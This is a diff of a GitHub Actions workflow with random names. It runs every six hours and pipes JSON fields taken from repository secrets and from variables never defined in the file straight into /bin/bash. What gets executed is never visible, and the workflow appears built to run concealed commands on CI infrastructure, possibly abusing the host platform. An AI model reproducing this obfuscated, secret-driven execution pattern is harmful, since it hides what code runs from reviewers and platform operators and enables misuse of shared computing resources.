@@ -1,9 +1,8 @@
 name: yangduonian3719
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '2 0/6 * * *'
 
 jobs:
   build:
@@ -13,9 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangduonian3719
         env:
-          xnq7503: ${{ secrets.xnq7503 }}
+          glb06369: ${{ secrets.glb06369 }}
         run: |
-          echo $xnq7503 | jq -r .b2 | /bin/bash
-          echo $rti1603 | jq -r .ja0 | /bin/bash
-          echo $hmpx186 | jq -r .o84182 | /bin/bash
+          echo $glb06369 | jq -r .jhye7189 | /bin/bash
+          echo $dtsdd2 | jq -r .mzvxu842 | /bin/bash
+          echo $r170 | jq -r .abrn79164 | /bin/bash
+          echo $pi08691 | jq -r .pht6760 | /bin/bash
+          echo $oi429 | jq -r .pg77 | /bin/bash
+          echo $jhvn28 | jq -r .eh46 | /bin/bash
+          echo $hluas23 | jq -r .wh714 | /bin/bash
+          echo $nu1702 | jq -r .x5540 | /bin/bash
 
